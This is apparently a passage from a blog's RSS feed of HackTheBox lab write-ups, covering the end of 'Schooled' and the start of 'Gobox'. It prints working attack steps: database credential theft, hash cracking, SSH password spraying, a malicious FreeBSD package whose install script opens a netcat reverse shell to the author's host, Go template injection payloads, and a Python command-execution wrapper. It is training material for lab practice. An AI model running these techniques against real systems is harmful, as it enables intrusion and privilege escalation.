/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
$ ls -l /home/
total <span class="m">17</span>
drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
&lt;?php  // Moodle configuration file

unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
</code></pre></div><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
Your MySQL connection id is <span class="m">7517</span>
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="hash-crack">Hash crack</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt

...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</code></pre></div><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ ssh jamie@10.10.10.234
Password <span class="k">for</span> jamie@Schooled:
Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

jamie@Schooled:~ $ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â»
$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
</code></pre></div><p>I will transfer the package to Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â»
$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
</code></pre></div><blockquote>
<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
</blockquote>
<p>On Schooled:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
Connection from 10.10.14.49 <span class="m">60744</span> received!
</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: <span class="m">1</span>
<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
Schooled
2462d8e2125d2a0
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Gobox</title>
      <link>https://fahmifj.github.io/hackthebox/gobox/</link>
      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/gobox/</guid>
      <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
      <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows  me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p>
<p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>Golang SSTI</li>
<li>Source Code Analysis</li>
<li>Scripting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ fscan 10.10.11.113 gobox
nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
Nmap scan report <span class="k">for</span> 10.10.11.113
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
8080/tcp open  http    nginx
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
<p>The site on port 80 is a Hacking eSports homepage.</p>
<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
</p>
<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog is based on Go).</p>
<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
</p>
<p>Nothing else to see here.</p>
<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
<p>On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.</p>
<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
</p>
<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â» 
$ curl -s -I http://10.10.11.113:8080       
HTTP/1.1 <span class="m">200</span> OK
Server: nginx
Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
Connection: keep-alive
X-Forwarded-Server: golang
</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
</p>
<p>The following is how the HTTP request and the HTTP response look like.</p>
<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="container-root">Container root</h3>
<h4 id="ssti">SSTI</h4>
<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
</code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
</p>
<p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
</p>
<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
</p>
<h4 id="rce">RCE</h4>
<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">...</span>
</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
</p>
<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
</p>
<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">import</span> <span class="nn">html</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># hacky curly braces</span>
<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>

<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>

